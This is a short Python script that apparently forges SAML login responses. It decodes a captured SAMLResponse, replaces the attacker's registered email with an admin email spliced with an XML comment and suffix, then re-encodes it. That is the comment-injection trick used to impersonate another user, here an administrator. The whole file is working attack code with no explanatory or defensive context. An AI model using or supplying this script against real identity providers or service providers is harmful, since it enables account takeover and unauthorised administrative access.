import urllib.parse
import base64
from urllib.parse import unquote
from urllib.parse import quote


tempEmail = input('Registered Email: ').encode('UTF-8')
suffix = input ('Suffix Added: ').encode('UTF-8')
adminEmail = input('Admin Email: ').encode('UTF-8')



saml_dec = base64.b64decode(unquote(input('SAMLRespone: ')))


saml_dec = saml_dec.replace(tempEmail, (adminEmail + b'<!--hoho-->' + suffix))
final = urllib.parse.quote(base64.b64encode(saml_dec).decode())

print ('\n\n\n\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n\n\n\n')
print (final)

